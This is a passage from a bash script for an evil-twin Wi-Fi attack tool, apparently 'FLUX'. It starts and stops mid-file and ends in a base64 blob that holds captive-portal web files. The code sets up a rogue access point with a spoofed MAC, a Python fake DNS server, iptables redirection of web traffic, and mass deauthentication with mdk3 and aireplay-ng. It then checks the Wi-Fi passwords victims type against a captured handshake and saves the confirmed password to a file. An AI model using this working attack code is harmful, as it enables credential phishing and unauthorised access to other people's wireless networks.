      lon=ord(data[ini])
      while lon != 0:
	self.dominio+=data[ini+1:ini+lon+1]+'.'
	ini+=lon+1
	lon=ord(data[ini])

  def respuesta(self, ip):
    packet=''
    if self.dominio:
      packet+=self.data[:2] + \"\x81\x80\"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
      packet+=self.data[12:]
      packet+='\xc0\x0c'
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
    return packet

if __name__ == '__main__':
  ip='$IP'
  print 'pyminifakeDwebconfNS:: dom.query. 60 IN A %s' % ip

  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('',53))

  try:
    while 1:
      data, addr = udps.recvfrom(1024)
      p=DNSQuery(data)
      udps.sendto(p.respuesta(ip), addr)
      print 'Request: %s -> %s' % (p.dominio, ip)
  except KeyboardInterrupt:
    print 'Finalizando'
    udps.close()" > $DUMP_PATH/fakedns
	chmod +x $DUMP_PATH/fakedns
}

# Set up DHCP / WEB server
# Set up DHCP / WEB server
function routear {

	ifconfig $interfaceroutear up
	ifconfig $interfaceroutear $IP netmask 255.255.255.0

	route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
	sysctl -w net.ipv4.ip_forward=1 &>$flux_output_device

  iptables --flush
  iptables --table nat --flush
  iptables --delete-chain
  iptables --table nat --delete-chain
  iptables -P FORWARD ACCEPT

  iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
  iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:443
  iptables -A INPUT -p tcp --sport 443 -j ACCEPT
  iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
  iptables -t nat -A POSTROUTING -j MASQUERADE

}

# Attack
function attack {

	if [ "$fakeapmode" = "hostapd" ]; then
		interfaceroutear=$WIFI
	elif [ "$fakeapmode" = "airbase-ng" ]; then
		interfaceroutear=at0
	fi

	handshakecheck
	nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)

	if [ "$fakeapmode" = "hostapd" ]; then

		ifconfig $WIFI down
		sleep 0.4
		macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $flux_output_device
		sleep 0.4
		ifconfig $WIFI up
		sleep 0.4
	fi


	if [ $fakeapmode = "hostapd" ]; then
		killall hostapd &> $flux_output_device
		xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
		elif [ $fakeapmode = "airbase-ng" ]; then
		killall airbase-ng &> $flux_output_device
		xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
	fi
	sleep 5

	routear &
	sleep 3


	killall dhcpd &> $flux_output_device
	fuser -n tcp -k 53 67 80 &> $flux_output_device
	fuser -n udp -k 53 67 80 &> $flux_output_device

	xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
	xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e "if type python2 >/dev/null 2>/dev/null; then python2 $DUMP_PATH/fakedns; else python $DUMP_PATH/fakedns; fi" &

	lighttpd -f $DUMP_PATH/lighttpd.conf &> $flux_output_device

	killall aireplay-ng &> $flux_output_device
	killall mdk3 &> $flux_output_device
	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b /root/ph/mdk3.txt -c $Host_CHAN &

	xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
	conditional_clear

	while true; do
		top

		echo -e ""$red"["$yellow"i"$red"]"$transparent" Attack in progress .."
		echo "                                       "
		echo "      1) Choose another network"
		echo "      2) Exit"
		echo " "
		echo -n '      #> '
		read yn
		case $yn in
			1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
			2 ) matartodo; exitmode; break;;
			* ) echo "
$general_case_error"; conditional_clear ;;
		esac
	done

}

# Checks the validity of the password
function handshakecheck {

	echo "#!/bin/bash

	echo > $DUMP_PATH/data.txt
	echo -n \"0\"> $DUMP_PATH/hit.txt
	echo "" >$DUMP_PATH/loggg

	tput civis
	clear

	minutos=0
	horas=0
	i=0
	timestamp=\$(date +%s)

	while true; do

	segundos=\$i
	dias=\`expr \$segundos / 86400\`
	segundos=\`expr \$segundos % 86400\`
	horas=\`expr \$segundos / 3600\`
	segundos=\`expr \$segundos % 3600\`
	minutos=\`expr \$segundos / 60\`
	segundos=\`expr \$segundos % 60\`

	if [ \"\$segundos\" -le 9 ]; then
	is=\"0\"
	else
	is=
	fi

	if [ \"\$minutos\" -le 9 ]; then
	im=\"0\"
	else
	im=
	fi

	if [ \"\$horas\" -le 9 ]; then
	ih=\"0\"
	else
	ih=
	fi">>$DUMP_PATH/handcheck

	if [ $authmode = "handshake" ]; then
		echo "if [ -f $DUMP_PATH/pwattempt.txt ]; then
		cat $DUMP_PATH/pwattempt.txt >> \"$PASSLOG_PATH/$Host_SSID-$Host_MAC.log\"
		rm -f $DUMP_PATH/pwattempt.txt
		fi

		if [ -f $DUMP_PATH/intento ]; then

		if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Passphrase not in\"; then
		echo \"2\">$DUMP_PATH/intento
		break
		else
		echo \"1\">$DUMP_PATH/intento
		fi

		fi">>$DUMP_PATH/handcheck

	elif [ $authmode = "wpa_supplicant" ]; then
		  echo "
		if [ -f $DUMP_PATH/pwattempt.txt ]; then
                cat $DUMP_PATH/pwattempt.txt >> $PASSLOG_PATH/$Host_SSID-$Host_MAC.log
                rm -f $DUMP_PATH/pwattempt.txt
                fi

		wpa_passphrase $Host_SSID \$(cat $DUMP_PATH/data.txt)>$DUMP_PATH/wpa_supplicant.conf &
		wpa_supplicant -i$WIFI -c$DUMP_PATH/wpa_supplicant.conf -f $DUMP_PATH/loggg &

		if [ -f $DUMP_PATH/intento ]; then

		if grep -i 'WPA: Key negotiation completed' $DUMP_PATH/loggg; then
		echo \"2\">$DUMP_PATH/intento
		break
		else
		echo \"1\">$DUMP_PATH/intento
		fi

		fi
		">>$DUMP_PATH/handcheck
	fi

	echo "readarray -t CLIENTESDHCP < <(nmap -PR -sn -n -oG - $RANG_IP.100-110 2>&1 | grep Host )

	echo
	echo -e \"  ACCESS POINT:\"
	echo -e \"    SSID............: "$white"$Host_SSID"$transparent"\"
	echo -e \"    MAC.............: "$yellow"$Host_MAC"$transparent"\"
	echo -e \"    Channel.........: "$white"$Host_CHAN"$transparent"\"
	echo -e \"    Vendor..........: "$green"$Host_MAC_MODEL"$transparent"\"
	echo -e \"    Operation time..: "$blue"\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
	echo -e \"    Attempts........: "$red"\$(cat $DUMP_PATH/hit.txt)"$transparent"\"
	echo -e \"    Clients.........: "$blue"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)"$transparent"\"
	echo
	echo -e \"  CLIENTS ONLINE:\"

	x=0
	for cliente in \"\${CLIENTESDHCP[@]}\"; do
	  x=\$((\$x+1))
	  CLIENTE_IP=\$(echo \$cliente| cut -d \" \" -f2)
	  CLIENTE_MAC=\$(nmap -PR -sn -n \$CLIENTE_IP 2>&1 | grep -i mac | awk '{print \$3}' | tr [:upper:] [:lower:])

	  if [ \"\$(echo \$CLIENTE_MAC| wc -m)\" != \"18\" ]; then
		CLIENTE_MAC=\"xx:xx:xx:xx:xx:xx\"
	  fi

	  CLIENTE_FABRICANTE=\$(macchanger -l | grep \"\$(echo \"\$CLIENTE_MAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)

	  if echo \$CLIENTE_MAC| grep -q x; then
		    CLIENTE_FABRICANTE=\"unknown\"
	  fi

	  CLIENTE_HOSTNAME=\$(grep \$CLIENTE_IP $DUMP_PATH/clientes.txt | grep DHCPACK | sort | uniq | head -1 | grep '(' | awk -F '(' '{print \$2}' | awk -F ')' '{print \$1}')

	  echo -e \"    $green \$x) $red\$CLIENTE_IP $yellow\$CLIENTE_MAC $transparent($blue\$CLIENTE_FABRICANTE$transparent) $green \$CLIENTE_HOSTNAME$transparent\"
	done

	echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck


	if [ $authmode = "handshake" ]; then
		echo "let i=\$(date +%s)-\$timestamp
		sleep 1">>$DUMP_PATH/handcheck

	elif [ $authmode = "wpa_supplicant" ]; then
		echo "sleep 5

		killall wpa_supplicant &>$flux_output_device
		killall wpa_passphrase &>$flux_output_device
		let i=\$i+5">>$DUMP_PATH/handcheck
	fi

	echo "done
	clear
	echo \"1\" > $DUMP_PATH/status.txt

	sleep 7

	killall mdk3 &>$flux_output_device
	killall aireplay-ng &>$flux_output_device
	killall airbase-ng &>$flux_output_device
	kill \$(ps a | grep python| grep fakedns | awk '{print \$1}') &>$flux_output_device
	killall hostapd &>$flux_output_device
	killall lighttpd &>$flux_output_device
	killall dhcpd &>$flux_output_device
	killall wpa_supplicant &>$flux_output_device
	killall wpa_passphrase &>$flux_output_device

	echo \"
	FLUX $version by deltax

	SSID: $Host_SSID
	BSSID: $Host_MAC ($Host_MAC_MODEL)
	Channel: $Host_CHAN
	Security: $Host_ENC
	Time: \$ih\$horas:\$im\$minutos:\$is\$segundos
	Password: \$(cat $DUMP_PATH/data.txt)
	\" >\"$HOME/$Host_SSID-password.txt\"">>$DUMP_PATH/handcheck


	if [ $authmode = "handshake" ]; then
		echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"The password was saved in "$red"$HOME/$Host_SSID-password.txt"$transparent"\"
		">>$DUMP_PATH/handcheck

	elif [ $authmode = "wpa_supplicant" ]; then
		echo "echo -e \"The password was saved in "$red"$HOME/$Host_SSID-password.txt"$transparent"\"">>$DUMP_PATH/handcheck
	fi

	echo "kill -INT \$(ps a | grep bash| grep flux | awk '{print \$1}') &>$flux_output_device">>$DUMP_PATH/handcheck
	chmod +x $DUMP_PATH/handcheck
}


############################################# < ATTACK > ############################################






############################################## < STUFF > ############################################

# Deauth all
function deauthall {

	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
}

function deauthmdk3 {

	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating via mdk3 all clients on $Host_SSID" -e mdk3 $WIFI_MONITOR d -b /root/ph/mdk3.txt -c $Host_CHAN &
	mdk3PID=$!
}

# Deauth to a specific target
function deauthesp {

	sleep 2
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating client $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
}

# Close all processes
function matartodo {

	killall aireplay-ng &>$flux_output_device
	kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
	killall hostapd &>$flux_output_device
	killall lighttpd &>$flux_output_device
	killall dhcpd &>$flux_output_device
	killall xterm &>$flux_output_device

}



############################################## < STUFF > ############################################






######################################### < INTERFACE WEB > ########################################

# Create the contents for the web interface
function NEUTRA {

	if [ ! -d $DUMP_PATH/data ]; then
		mkdir $DUMP_PATH/data
	fi

	echo "UEsDBAoAAAAAAEQCTUkAAAAAAAAAAAAAAAAEAAAAY3NzL1BLAwQUAAAACACyuUxJ8qGcyENfAABp
KgMAHwAAAGNzcy9qcXVlcnkubW9iaWxlLTEuNC41Lm1pbi5jc3PsXeuTGzdy/35/he6qturu4hnj
/VAeVTZlma6ik0utb1PJlxTFpZe8Gy11yxVlXZL/PegHMOBqtaQku8pcwfJyAAwGz+nfNLobjS//
+Nsnf/n318ubt0++37xYD8snsje9ffK/T75d3z6ZfvPVs9V8u3r6xIWltUv/5J/+5YkS0nRSdFr+
IP1TrZ9q8V8p/+8Xf4Bb4gvMkAt9vnl9fTm/XW+uv3jy3fWiTxn/8je4029urr4c1ovl9Xb55I9f
/uY3/et1t15srrv5ArI/nf94u7z5nxfzxV+vbqCQbv1yfrV8+vpm+P3vUonzpxj/cru7+oefXg7/
uFjNb7bL23/+83n31fnku+++ONOTM/083TpTYre82a4312f62ZlSshfpN6Uurxeby/X1FSWvt5su
BBs7CXf18zP9TSrit8/+bfLDf/7pm5Q91ZR+//Tnr2ffTVIg5erO1PP0/3/oCQWe/ZAKEucX36Zf
2UtK/OZfqbb0u7q9fXWmv6L0N2/e9G80DEOKfHszf7VaL7YpiI8/p8exwOepYin7y9tLKAhbRU25
0ytJ9awvKWE2f7u8+W9OTMNwvaX09zdCCSGour2HvvppWF//9dDDMsaYLpSXHqdHxKufKP72Tjz9
/2Z9ebvi9pucvlqur1a3d1N36+Wbrze5zJQAf9LwD+TY3r4dlnR/eT1/MSy78eVJbb5evuGn6if1
16WvKc/21XzBRby6WW6XN7tlGfNX89vVfi0/rocBB0M/x/9KYTwD36cBmdidHmxnZhAWO70QcO1s
+fUTB7nSX6yvf0/FfC/T7E2kmqoLu5KD6tRU7KRcSX3hhy5VNFEXUv0d6+TXladPf/O7P/zfSFDD
8ua20VOjp1OnJw9UMxNIFCtpZhhHSoGQlItO9NZqpC2Zwsb4dJVbDkGeTi5KHojDFe5yWJ57vou0
R8WWGkIKTBxnTxEk3fwAhi/sQoyNOL7aHZWXy8rXwG0IRxD5zc3mTXfZDY3QG6H/ugh9M7y9SqOt
BBH4M7iDNE4lvNqsr2+3udlnaqKhBkmkInRviSCo/onhK7WjhBxmkwLz1cRyVWjm6nNMeBArbhpW
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
